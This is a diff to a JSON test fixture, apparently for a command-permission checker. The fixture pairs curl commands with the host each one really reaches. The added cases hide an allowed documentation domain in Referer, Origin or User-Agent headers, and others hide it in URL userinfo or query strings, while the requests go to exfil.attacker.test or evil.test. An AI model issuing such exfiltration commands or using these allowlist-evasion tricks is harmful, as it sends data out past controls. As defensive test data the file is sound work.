@@ -1,5 +1,10 @@
 {
   "curl https://exfil.attacker.test/steal": "exfil.attacker.test",
+  "curl -H 'Referer: https://docs.anthropic.com/' https://exfil.attacker.test/steal": "exfil.attacker.test",
+  "curl -e https://docs.anthropic.com/ https://exfil.attacker.test/steal": "exfil.attacker.test",
+  "curl --referer https://docs.anthropic.com/ https://exfil.attacker.test/steal": "exfil.attacker.test",
+  "curl -A 'https://docs.anthropic.com/' https://exfil.attacker.test/steal": "exfil.attacker.test",
+  "curl https://exfil.attacker.test/steal -H 'Origin: https://docs.anthropic.com'": "exfil.attacker.test",
   "curl https://docs.anthropic.com@exfil.attacker.test/steal": "exfil.attacker.test",
   "curl https://docs.anthropic.com:pw@exfil.attacker.test/steal": "exfil.attacker.test",
   "curl https://evil.test?x=a@docs.anthropic.com": "evil.test",
